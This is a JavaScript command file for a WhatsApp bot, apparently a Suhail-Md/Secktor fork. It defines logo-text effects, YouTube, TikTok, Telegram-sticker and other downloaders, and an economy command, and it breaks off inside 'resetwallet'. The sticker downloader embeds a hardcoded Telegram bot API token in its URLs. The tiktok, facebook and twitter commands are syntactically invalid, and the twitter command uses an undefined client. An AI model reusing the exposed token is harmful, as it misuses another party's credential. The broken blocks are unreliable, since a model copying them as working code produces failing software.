cmd({ pattern: "toxic", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , 'toxic-text-effect-online-901' , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "ancient", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , '3d-golden-ancient-text-effect-online-free-1060' , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "cloud", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , 'create-a-cloud-text-effect-on-the-sky-online-1004' , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "transformer", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , 'create-a-transformer-text-effect-online-1035' , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "thunder", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel ,'online-thunder-text-effect-generator-1031'  , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "scifi", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , 'create-3d-sci-fi-text-effect-online-1050' , text )
        })
    //---------------------------------------------------------------------------
cmd({pattern: "sand", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel ,'write-in-sand-summer-beach-free-online-991'  , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "rainbow", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , '3d-rainbow-color-calligraphy-text-effect-1049' , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "pencil", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , 'create-a-sketch-text-effect-online-1044' , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "neon", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , 'create-3d-neon-light-text-effect-online-1028' , text )
        })
    //---------------------------------------------------------------------------
cmd({pattern: "magma", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel ,'create-a-magma-hot-text-effect-online-1030'  , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "leaves", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , 'natural-leaves-text-effect-931' , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "glitch", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , 'create-impressive-glitch-text-effects-online-1027' , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "discovery", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , 'create-space-text-effects-online-free-1042' , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "christmas", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel ,'christmas-tree-text-effect-online-free-1057'  , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "candy", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , 'create-christmas-candy-cane-text-effect-1056' , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "1917", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Need text._')
            return await singleText(Void, citel , '1917-style-text-effect-online-980' , text )
        })
    //---------------------------------------------------------------------------
cmd({ pattern: "blackpink", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , 'create-blackpink-logo-style-online-1001' , text )
    })










































































    cmd({
        pattern: "tgs",
        desc: "Downloads telegram stickers.",
        category: "downloader",
        filename: __filename,
        use: '<add sticker url.>'
    },
    async(Void, citel, text) => {
    if (!text) return await citel.reply("_Enter a tg sticker url_\nEg: .tgs https://t.me/addstickers/Oldboyfinal\nKeep in mind that there is a chance of ban if used frequently");
    if (!text.includes("addstickers"))  return await citel.reply("_Uhh Please Enter a Valid tg sticker url_\nEg: .tgs https://t.me/addstickers/Oldboyfinal");
    let tgUrl = text.split("|")[0];
    let find = tgUrl.split("/addstickers/")[1];
    let { result } = await fetchJson(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(find)} `);
    let check = text.split("|")[1] || "";
    let res = `Total stickers: ${result.stickers.length}\n*Estimated complete in:* ${result.stickers.length * 1.5} seconds\nKeep in mind that there is a chance of a ban if used frequently`.trim()
    if (result.is_animated) return await citel.reply("Animated stickers are not supported");
      else if (check.startsWith("info")) return await citel.reply(res);
    let limit = parseInt(check.split(",")[0]) || 10;
    let count =  parseInt(check.split(",")[1]) ||  0;
     let isCheckText = check.split(";")[1] ||  "Sticker"
    let isSticker = true ;
        if (isCheckText.includes("photo") ){isSticker = false ;	isCheckText = "Photo"}
    if(limit > result.stickers.length ) {  limit = result.stickers.length  }
        if(count > result.stickers.length ) {  count = result.stickers.length - 5  }
    if(count > limit ){let temp = limit ;   limit = count;	count = temp ;}
    await citel.reply(`${res}\n\n_Downloading as ${isCheckText} From index *${count}* to *${limit}*._\nIf you wants more to download then use Like \n\n .tgs ${tgUrl} |  10 ,  20 ; photo`)
    for ( count ; count < limit ; count++) 
    {
     // if (count >= limit) break;
      let file_path = await fetchJson(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${result.stickers[count].file_id}`);
      let sticUrl = `https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/${file_path.result.file_path}`;
      if(isSticker) { let a = await getBuffer(sticUrl); await citel.reply(a, { packname: Config.packname, author: "Suhail-Md"  }, "sticker");} 
      else { await Void.sendMessage(citel.chat,{image : {url : sticUrl } , caption : `*_Telegram Sticker At Index ${count+1} Downloaded_*`}) } 
    }
})
//---------------------------------------------------------------------------
cmd ( {
    name: 'tiktok',
    description: 'Downloads Tiktok Videos Via Url.',
    category: 'downloader',
    use: '<add tiktok url.>',
    async execute(Void, citel, text) {
        if (!text) return await citel.reply('*Uhh Please, Provide me tiktok Video Url*\n*_Ex .tiktok https://www.tiktok.com/@dakwahmuezza/video/7150544062221749531_*');
        let url = text.split(" ")[0];
        if (!/https:\/\/www\.tiktok\.com\/@.+\/video\/.+/.test(url)) return await citel.send('*Uhh Please, Give me Valid Tiktok Video Url!*');
        try {
            const response = await axios.get(`https://api.maher-zubair.tech/download/tiktok2?url=${url}`);
            if (response.data.status) {
                const { video, thumbnail, audio } = response.data;
                await citel.sendMessage(citel.chat, { video: { url: video }, caption: Config.caption }, { quoted: citel });
            } else {
                await citel.send('Error While Downloading Your Video');
            }
        } catch (error) {
            console.log(error);
            await citel.send('Error While Downloading Your Video');
        }
    }
}
)
//------------------
cmd ( {
    name: 'facebook',
    desc: 'Downloads fb videos.',
    category: 'downloader',
    use: '<add fb url.>',
    async (Void, citel, text) {
        if (!text || !text.startsWith("https://")) {
            return await citel.reply('*_Please Give me Facebook Video Url_*\n*Example _' + Config.prefix + 'fb https://www.facebook.com/watch/?v=2018727118289093_*');
        }
        try {
            const response = await axios.get(`https://api.maher-zubair.tech/download/fb2?url=${text}`);
            if (response.data.status) {
                const { video, thumbnail, audio } = response.data;
                await citel.sendMessage(citel.chat, { video: { url: video }, caption: Config.caption }, { quoted: citel });
            } else {
                await citel.send('*_Error, Video Not Found_*');
            }
        } catch (error) {
            console.log("error while Fb Downloading : ", error);
            await citel.send('*_Error, Video Not Found_*');
        }
    }
}
)

//---------------------------------------------------------------------------

cmd({
        pattern: "apk",
        desc: "Downloads apks  .",
        category: "downloader",
        filename: __filename,
        use: '<add sticker url.>',
    },

    async(Void, citel, text) => {
    if(!text )return citel.reply("*_Give me App Name_*");

const getRandom = (ext) => { return `${Math.floor(Math.random() * 10000)}${ext}`; };
let randomName = getRandom(".apk");
const filePath = `./${randomName}`;     // fs.createWriteStream(`./${randomName}`)
    const {  search , download } = require('aptoide-scraper')
let searc = await search(text);          //console.log(searc);
let data={};
if(searc.length){ data = await download(searc[0].id); }
else return citel.send("*_APP not Found, Try Other Name_*");


const apkSize = parseInt(data.size);
if(apkSize > 100) return citel.send(`❌ File size bigger than 150mb.`);
   const url = data.dllink;
 let  inf  ="*App Name :* " +data.name;
     inf +="\n*App id        :* " +data.package;
     inf +="\n*Last Up       :* " +data.lastup;
     inf +="\n*App Size     :* " +data.size;
    // inf +="\n*App Link     :* " +data.dllink;
inf +="\n\n "+ Config.caption
     

axios.get(url, { responseType: 'stream' })
.then(response => {
const writer = fs.createWriteStream(filePath);
response.data.pipe(writer);

return new Promise((resolve, reject) => {
  writer.on('finish', resolve);
  writer.on('error', reject);
});
}).then(() => {

let buttonMessage = {
                    document: fs.readFileSync(filePath),
                    mimetype: 'application/vnd.android.package-archive',
                    fileName: data.name+`.apk`,
                    caption : inf
                    
                }
              Void.sendMessage(citel.chat, buttonMessage, { quoted: citel })

console.log('File downloaded successfully');


fs.unlink(filePath, (err) => {
  if (err) { console.error('Error deleting file:', err); } else { console.log('File deleted successfully'); } });
}) .catch(error => {
fs.unlink(filePath)
return citel.send('*_Apk not Found, Sorry_*')
});
}
)
//---------------------------------------------------------------------------
cmd({
        pattern: "gdrive",
        desc: "Downloads Gdrive.",
        category: "downloader",
        filename: __filename,
        use: '<add sticker url.>'
    },

async(Void, citel, text) => {
if (!text) return citel.send('Uhh Please, Give me  Google Drive Url') 
if (!(text && text.match(/drive\.google/i))) citel.send('Uhh Please, Give me Valid Google Drive Url')
let id =(text.match(/\/?id=(.+)/i) || text.match(/\/d\/(.*?)\//))[1]
if (!id) return citel.reply('ID Not Found');
try {
GDriveDl(id).then(async (res) => 
{ 
            let data  =  "*File Name :* "+ res.fileName ;
            data +="\n*File Size :* " + res.size +"Mb" ;
            data +="\n*File Type :* "+ res.mimetype.split('/')[1] +  "\n" + Config.caption;
        let buttonMessage = 
    {
        document: { url: res.downloadUrl },
        fileName: res.fileName,
        mimetype: res.mimetype,
        caption : "\t  *GOOGLE DRIVE DOWNLOADER*  \n" + data
    }
        return await Void.sendMessage(citel.chat,buttonMessage, { quoted: citel })
})
} catch (error) {  return citel.reply("```File Not Found```" ) }

})
//---------------------------------------------------------------------------
cmd({
        pattern: "gitclone",
        desc: "Downloads apks  .",
        category: "downloader",
        filename: __filename,
        use: '<add sticker url.>',
    },
    async(Void, citel, text) => {
if (!text) return await citel.send('*Provide Repo Url, Ex:- _.gitclone https://github.com/Astropeda/whatsapp-bot_*') 
const regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text) ) return await citel.send('*Uhh Please, Provide Valid Repositry Url*');
let [_, user, repo] = text.match(regex) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, { method: 'HEAD' })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
await Void.sendMessage(citel.chat , {document : { url : url }, fileName:  filename,mimetype: 'application/zip',  })

})

//---------------------------------------------------------------------------
cmd({
        pattern: "tts",
        desc: "text to speech.",
        category: "downloader",
        filename: __filename,
        use: '<Hii,this is Suhail>',
    },
    async(Void, citel, text) => {
        if (!text && !citel.quoted) return citel.reply(`*Please give me Text*\n *_Example : .tts Hi,I am Suhail Tech._*`);
        if (!text) { text=citel.quoted.text;  }
        let texttts = text
        const ttsurl = googleTTS.getAudioUrl(texttts, {
            lang: "en",
            slow: false,
            host: "https://translate.google.com",
        });
        return Void.sendMessage(citel.chat,{audio: {url: ttsurl}, mimetype: "audio/mpeg", fileName: `ttsCitelVoid.m4a` },{quoted: citel } );
    }

)
//---------------------------------------------------------------------------
cmd({
        pattern: "video",
        desc: "Downloads video from yt.",
        category: "downloader",
        filename: __filename,
        use: '<faded-Alan Walker>',
    },
    async(Void, citel, text) => {
        if (!text) return citel.reply(`Example : ${prefix}video Back in black`)
        let yts = require("secktor-pack")
        let search = await yts(text)
    let i = search.all[1] ;
        
        const getRandom = (ext) => { return `${Math.floor(Math.random() * 10000)}${ext}`;   };
        try {
    let urlYt = i.url ; 
            let infoYt = await ytdl.getInfo(urlYt);

            let VidTime = Math.floor(i.timestamp* 60);
    if( VidTime  >= videotime) return await citel.reply(`❌ Video file too big!`);
            let titleYt = infoYt.videoDetails.title;
            let randomName = getRandom(".mp4");
            const stream = ytdl(urlYt, {   filter: (info) => info.itag == 22 || info.itag == 18, })
                .pipe(fs.createWriteStream(`./${randomName}`));
            await new Promise((resolve, reject) => {
                stream.on("error", reject);
                stream.on("finish", resolve);
            });
               
    let buttonMessage = {
                    video: fs.readFileSync(`./${randomName}`),
                    mimetype: 'video/mp4',
                    caption: "  Here's Your Video" + Config.caption ,
                }
             Void.sendMessage(citel.chat, buttonMessage, { quoted: citel })
             return fs.unlinkSync(`./${randomName}`);

            }catch(e){return await citel.reply("Error While Downloading Video : " + e ); }
    }
)
//---------------------------------------------------------------------------
cmd({
        pattern: "play",
        alias: ["music"],
        desc: "Sends info about the query(of youtube video/audio).",
        category: "downloader",
        filename: __filename,
        use: '<faded-Alan walker.>',
    },
async(Void, citel, text) => {
const getRandom = (ext) => { return `${Math.floor(Math.random() * 10000)}${ext}`; };    
if (text.length == 0 && !citel.quoted) return citel.reply(`Give Song Name, Ex ${prefix}play back in black*`);
try {
        let urlYt = text;
        if(!text){ text=citel.quoted.text; }

        if (!urlYt.startsWith("http")) 
        {
            let yts = require("secktor-pack");
            let search = await yts(text);
            let anu = search.videos[0];
            urlYt = anu.url; 
        }
        let infoYt = await ytdl.getInfo(urlYt);
        if (infoYt.videoDetails.lengthSeconds >= 1200) return citel.reply(`*song not Found, Try Differ Name*`);
        let titleYt = infoYt.videoDetails.title;   
    citel.reply(`_Downloading ${infoYt.videoDetails.title}?_`);
        let randomName = getRandom(".mp3");
        const stream = ytdl(urlYt, {
             filter: (info) => info.audioBitrate == 160 || info.audioBitrate == 128, })
             .pipe(fs.createWriteStream(`./${randomName}`));
            
   await new Promise((resolve, reject) => { stream.on("error", reject);  stream.on("finish", resolve);  });
        
        let stats = fs.statSync(`./${randomName}`);
        let fileSizeInBytes = stats.size;
        let fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
        if (fileSizeInMegabytes <= dlsize) 
        {
            let yts = require("secktor-pack");
            let search = await yts(text);
            let buttonMessage = 
            {
                audio: fs.readFileSync(`./${randomName}`),
                mimetype: 'audio/mpeg',
                fileName: titleYt + ".mp3",
                headerType: 4,
             }
             
            await Void.sendMessage(citel.chat, buttonMessage, { quoted: citel })
            return fs.unlinkSync(`./${randomName}`);
        } 
        else {   citel.reply(`❌ File size bigger than 100mb.`);    }
         return fs.unlinkSync(`./${randomName}`);

}catch (e) { return citel.reply(`Error While Downloading Your Song`);  }
})


//---------------------------------------------------------------------------
cmd({
        pattern: "sound",
        desc: "Downloads ringtone.",
        category: "downloader",
        filename: __filename,
        use: '<Dowanload Tiktok Sounds>',
    },
    async(Void, citel, text) => {
        if (!text) return citel.send(`*Give A Number Example: ${prefix}sound 5*`)
const n = parseInt(text);
if(n.toString()=="NaN" || n < 1 || n > 160 ) return citel.reply('```❌ Give Me A Number From 1 to 160```');
   let url = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound${n.toString()}.mp3`
        let anu  = await getBuffer(url)
//await Void.sendMessage(citel.chat, { audio: botzy_buffer, mimetype: 'audio/mp4', ptt: true })
    let buttonMessage = {
    audio: anu,
    fileName: url.toString() ,
    mimetype: 'audio/mp4',
    ptt: true 
    }
return Void.sendMessage(citel.chat,buttonMessage, { quoted: citel } )
})

//---------------------------------------------------------------------------
cmd({
        pattern: "ringtone",
        desc: "Downloads ringtone.",
        category: "downloader",
        filename: __filename,
        use: '<ringtone name>',
    },
    async(Void, citel, text) => {
        if (!text) return citel.send(`Example: ${prefix}ringtone back in black`)
    const {ringtone } = require('../lib/scraper')
        let anu = await ringtone(text)
    let buttonMessage = {
    audio: { url: anu[0].audio },
    caption : `*${anu[0].title}*`,
    fileName: anu[0].title + '.mp3',
    mimetype: 'audio/mpeg',
    }
return Void.sendMessage(citel.chat,buttonMessage, { quoted: citel } )
})

//---------------------------------------------------------------------------
cmd({
        pattern: "pinterest",
        desc: "Downloads image from pinterest.",
        category: "downloader",
        filename: __filename,
        use: '<text|image name>',
    },
    async(Void, citel, text) => {
        if (!text) return citel.send(`What picture are you looking for?`) && Void.sendMessage(citel.chat, { react: {  text: '❌', key: citel.key  }  })
        try {
            let anu = await pinterest(text)
            let result = anu[Math.floor(Math.random() * anu.length)]
            let buttonMessage = {
                image: { url: result },
                caption: Config.caption ,
                headerType: 4,
                contextInfo: {
                    externalAdReply: {
                        title: `Here it is✨`,
                        body: `${Config.ownername}`,
                        thumbnail: log0,
                        mediaType: 2,
                        mediaUrl: ``,
                        sourceUrl: `github.com/Astropeda`
                    }
                }
            }
            return Void.sendMessage(citel.chat, buttonMessage, {  quoted: citel })
        } catch (e) {  return citel.reply("Uhh Plese, Give me a Name. Ex .pint apple")  }
    })
//---------------------------------------------------------------------------
cmd({
        pattern: "mediafire",
        alias :['mf','mfire'],
        desc: "Downloads media from Mediafire.",
        category: "downloader",
        filename: __filename,
        use: '<url of mediafire>',
    },
    async(Void, citel, text) => {
        if (!text) return citel.reply(`Give link ${tlang().greet}`);
        
        if (!text.includes("mediafire.com")) return citel.reply(`The link you provided is invalid`);
        let isUrl=text;
        const baby1 = await mediafire(isUrl);

if(!baby1.length) return citel.reply(`could not found anything`);
const apkSize = parseInt(baby1[0].size);
if(apkSize > 100) return citel.reply(`❌ File size bigger than 150mb.`);

let result4 = ` *Mᴇᴅɪᴀғɪʀᴇ Dᴏᴡɴʟᴏᴀᴅᴇʀ*
*Nᴀᴍᴇ* : ${baby1[0].nama}
*Sɪᴢᴇ* :${baby1[0].size}
*Mɪᴍᴇ* : ${baby1[0].mime}

`;
result4 +=Config.caption ; 
        let buttonMessaged = {
                document: { url: baby1[0].link, },
                caption: result4,
                fileName: baby1[0].nama,
                mimetype: baby1[0].mime,
                
            }; 
            
return await Void.sendMessage(citel.chat, buttonMessaged)
    }
)
//---------------------------------------------------------------------------

cmd({
        pattern: "song",
        alias: ["audio"],
        desc: "Downloads audio from youtube.",
        category: "downloader",
        filename: __filename,
        use: '<give text>',
    },
    async(Void, citel, text) => {

            if (!text) return await citel.reply(`*_Ohh PLease, Give Me Song Name_*`);
            let yts = require("secktor-pack")
            let search = await yts(text);
            let i = search.all[1] ;
            let cap = "\t *---Yt Song Searched Data---*   \n\nTitle : " + i.title + "\nUrl : " + i.url +"\nDescription : " + i.timestamp +"\nViews : "+i.views +"\nUploaded : " +i.ago +"\nAuthor : "+i.author.name+"\n\n\nReply 1 To Video \nReply 2 To Audio" ;
            Void.sendMessage(citel.chat,{image :{url : i.thumbnail}, caption :  cap });
})

//---------------------------------------------------------------------------
cmd({
        pattern: "yts",
        alias: ["ytsearch","getyt"],
        desc: "Gives descriptive info of query from youtube..",
        category: "downloader",
        filename: __filename,
        use: '<yt search text>',
    },
    async(Void, citel, text) => {
        let yts = require("secktor-pack");
        if (!text) return citel.reply(`Example : ${prefix}yts WhatsApp Bot`);
        let search = await yts(text);
        let textt = "*YouTube Search*\n Result From " + text + "\n   ─────────────────── \n";
        let no = 1;
        for (let i of search.all) 
    {
    textt += `*Title : ${i.title}*`
    textt += `\n*Url : ${i.url}* \n     *──────────────────*   \n`;
        }
        return Void.sendMessage(citel.chat, {
            image: {
                url: search.all[0].thumbnail,
            },
            caption: textt,
        }, {
            quoted: citel,
        });
    }
)
//---------------------------------------------------------------------------

cmd({
        pattern: "ytmp4",
        alias: ["ytv","ytvid" , "ytvideo"],
        desc: "Downloads video from youtube.",
        category: "downloader",
        filename: __filename,
        use: '<yt video url>',
    },
    async(Void, citel, text) => {
        const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`;
        };
        if (!text) {
            citel.reply(`❌Please provide me a url`);
            return;
        }
        try {
            let urlYt = text;
            if (!urlYt.startsWith("http")) return citel.reply(`❌ Give youtube link!`);
            let infoYt = await ytdl.getInfo(urlYt);
             if(infoYt.videoDetails.lengthSeconds >= videotime) return citel.reply(`❌ Video file too big!`);
            let titleYt = infoYt.videoDetails.title;
            let randomName = getRandom(".mp4");

            const stream = ytdl(urlYt, {
                    filter: (info) => info.itag == 22 || info.itag == 18,
                })
                .pipe(fs.createWriteStream(`./${randomName}`));
            await new Promise((resolve, reject) => {
                stream.on("error", reject);
                stream.on("finish", resolve);
            });
            let stats = fs.statSync(`./${randomName}`);
            let fileSizeInBytes = stats.size;
            let fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
            if (fileSizeInMegabytes <= dlsize) {
                let yts = require("secktor-pack");
                let search = await yts(text);
               
             
             
             let buttonMessage = {
                    video: fs.readFileSync(`./${randomName}`),
                    mimetype: 'video/mp4',
                    fileName: `${titleYt}.mp4`,
                    caption: "  *Here's Your Video*" + Config.caption ,
         gifPlayback: false,
               height: 496,
               width: 640,
               headerType: 4,
                    headerType: 4,
                    
                }
             Void.sendMessage(citel.chat, buttonMessage, { quoted: citel })
             return fs.unlinkSync(`./${randomName}`);
            } else {
                citel.reply(`❌ File size bigger than 200mb.`);
            }
            return fs.unlinkSync(`./${randomName}`);      
        } catch (e) {
            console.log(e)
        }
    }
)
//---------------------------------------------------------------------------
cmd({
    pattern: "ytmp3",
alias : ["yta"],
desc: "Downloads audio by yt link.",
    category: "downloader",
    use: '<yt video url>',
},
async(Void, citel, text) => {
    const getRandom = (ext) => {
        return `${Math.floor(Math.random() * 10000)}${ext}`;
    };

    if (text.length === 0) {
        citel.reply(`❌ URL is empty! \nSend ${prefix}ytmp3 url`);
        return;
    }
    try {
        let urlYt = text;
        if (!urlYt.startsWith("http")) {
            citel.reply(`❌ Give youtube link!`);
            return;
        }
        let infoYt = await ytdl.getInfo(urlYt);
        //30 MIN
        if (infoYt.videoDetails.lengthSeconds >= videotime) {
            citel.reply(`❌ I can't download that long video!`);
            return;
        }
        let titleYt = infoYt.videoDetails.title;
        let randomName = getRandom(".mp3");
        const stream = ytdl(urlYt, {
                filter: (info) => info.audioBitrate == 160 || info.audioBitrate == 128,
            })
            .pipe(fs.createWriteStream(`./${randomName}`));
        await new Promise((resolve, reject) => {
            stream.on("error", reject);
            stream.on("finish", resolve);
        });

        let stats = fs.statSync(`./${randomName}`);
        let fileSizeInBytes = stats.size;
        let fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
        if (fileSizeInMegabytes <= dlsize) {
            let yts = require("secktor-pack");
            let search = await yts(text);
            
         
         let buttonMessage = {
                audio: fs.readFileSync(`./${randomName}`),
                mimetype: 'audio/mpeg',
                fileName: titleYt + ".mp3",
                headerType: 4,
               
            }
         
         
            await Void.sendMessage(citel.chat, buttonMessage, { quoted: citel })
            return fs.unlinkSync(`./${randomName}`);
        } else {
            citel.reply(`❌ File size bigger than 200mb.`);
        }
        fs.unlinkSync(`./${randomName}`);
    } catch (e) {
        console.log(e)
    }

}
)

//---------------------------------------------------------------------------
cmd({
    pattern: "ytdoc",
        alias: ["ytd"],
    desc: "Downloads audio by yt link as document.",
    category: "downloader",
    use: '<ytdoc video url>',
},
async(Void, citel, text) => {
    const getRandom = (ext) => {  return `${Math.floor(Math.random() * 10000)}${ext}`;  };

    if (text.length === 0) return await citel.reply(`❌ URL is empty! \nSend ${prefix}ytmp3 url`);

    try {
        let urlYt = text;
        if (!urlYt.startsWith("http")) return await citel.reply(`❌ Give youtube link!`);
  
        let infoYt = await ytdl.getInfo(urlYt);
        //30 MIN
        if (infoYt.videoDetails.lengthSeconds >= videotime) return await citel.reply(`❌ I can't download that long video!`);

        let titleYt = infoYt.videoDetails.title;
        let randomName = getRandom(".mp3");
        const stream = ytdl(urlYt, {  filter: (info) => info.audioBitrate == 160 || info.audioBitrate == 128,  })
            .pipe(fs.createWriteStream(`./${randomName}`));
        await new Promise((resolve, reject) => {   stream.on("error", reject); stream.on("finish", resolve);    });

        let stats = fs.statSync(`./${randomName}`);
        let fileSizeInBytes = stats.size;
        let fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
        if (fileSizeInMegabytes <= dlsize) {
            let yts = require("secktor-pack");
            let search = await yts(text);
            let buttonMessage = {
                document: fs.readFileSync(`./${randomName}`),
                mimetype: 'audio/mpeg',
                fileName: titleYt + ".mp3",
              caption: "  *Here's Your File*\n" + Config.caption ,
                headerType: 4,
                contextInfo: {
                    externalAdReply: {
                        title: titleYt,
                        body: citel.pushName,
                        renderLargerThumbnail: true,
                        thumbnailUrl: search.all[0].thumbnail,
                        mediaUrl: text,
                        mediaType: 1,
                        thumbnail: await getBuffer(search.all[0].thumbnail),
                        sourceUrl: text,
                    },
                },
            }
            await Void.sendMessage(citel.chat, buttonMessage, { quoted: citel })
            return fs.unlinkSync(`./${randomName}`);
        } else {         citel.reply(`❌ File size bigger than 200mb.`);    }
        fs.unlinkSync(`./${randomName}`);
    } catch (e) {     console.log(e)    }

})

cmd({
    on: "text"
  }, async (Void, citel, text, {
    isCreator
  }) => {
    if (citel.quoted && citel.text) {
      const lines = citel.quoted.text.split("\n");
      if (lines[0].includes("Yt Song Searched Data")) {
        const urlLine = lines.find(_0x4d3aae => _0x4d3aae.startsWith("Url :"));
        let urlYt = urlLine.replace("Url :", "").trim();
        try {
          let randomName;
          if (citel.text.startsWith("1")) {
            randomName = "./ytsong.mp4";
            const stream = ytdl(urlYt, {
              filter: _0x366613 => _0x366613.itag == 22 || _0x366613.itag == 18
            }).pipe(fs.createWriteStream(randomName));
            await new Promise((_0x594b37, _0x3484a0) => {
              stream.on("error", _0x3484a0);
              stream.on("finish", _0x594b37);
            });
            await Void.sendMessage(citel.chat, {
              video: fs.readFileSync(randomName),
              mimetype: "video/mp4",
              caption: Config.caption
            }, {
              quoted: citel
            });
          } else if (citel.text.startsWith("2")) {
            randomName = "./ytsong.mp3";
            const stream = ytdl(urlYt, {
              filter: _0xb925ca => _0xb925ca.audioBitrate == 160 || _0xb925ca.audioBitrate == 128
            }).pipe(fs.createWriteStream(randomName));
            await new Promise((_0xbd802f, _0x3e8a3) => {
              stream.on("error", _0x3e8a3);
              stream.on("finish", _0xbd802f);
            });
            await Void.sendMessage(citel.chat, {
              audio: fs.readFileSync(randomName),
              mimetype: "audio/mpeg"
            }, {
              quoted: citel
            });
          }
          try {
            return fs.unlinkSync(randomName);
          } catch (_0x4b8369) {}
        } catch (_0x2c1b30) {
          return await citel.reply("Error While Downloading Video : " + _0x2c1b30);
        }
      }
    }
  });


//------------

cmd({
    name: 'twitter',
    description: 'Downloads Twitter videos.',
    category: 'downloader',
    use: '<add twitter url.>',
    async (Void, citel, text)  {
        if (!text || !text.startsWith("https://")) {
            return await citel.reply('*_Please Give me Twitter Video Url_*\n*Example _' + Config.prefix + 'twitter https://twitter.com/username/status/tweet_id_*');
        }
        try {
            const twitterId = text.split('/')[5];
            const { data } = await T.get('statuses/show', { id: twitterId });
            const videoUrl = data.extended_entities.media[0].video_info.variants.find(v => v.content_type.startsWith('video/mp4')).url;
            const response = await axios.get(`https://api.maher-zubair.tech/download/twitter?url=${videoUrl}`);
            if (response.data.status) {
                const { video, thumbnail, audio } = response.data;
                await citel.sendMessage(citel.chat, { video: { url: video }, caption: Config.caption }, { quoted: citel });
            } else {
                await citel.send('*_Error, Video Not Found_*');
            }
        } catch (error) {
            console.log("error while Twitter Downloading : ", error);
            await citel.send('*_Error, Video Not Found_*');
        }
    }
});






































































cmd({
    pattern: "daily",
    desc: "daily gold.",
    category: "economy",
    filename: __filename,
    react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
   let zerogroup = (await sck.findOne({  id: citel.chat,   })) || (await new sck({  id: citel.chat, }).save());
   let mongoschemas = zerogroup.economy || "false";
   if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
   if (!citel.isGroup) return citel.reply(tlang().group);
const secktor = "secktor"
const daily  = await eco.daily(citel.sender, secktor, 2000); //give 500 for daily, can be changed
if (daily.cd) { //cdL is already formatted cooldown Left

   return await citel.reply(`🧧 You already claimed daily for today, come back in ${daily.cdL}🫡`);
} else {
citel.reply(`you claimed daily ${daily.amount} 🪙 for today🎉.`);   
}
}
)

cmd({
    pattern: "resetwallet",
    desc: "reset wallet of quoted user.",
    category: "economy",
    filename: __filename,
    react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
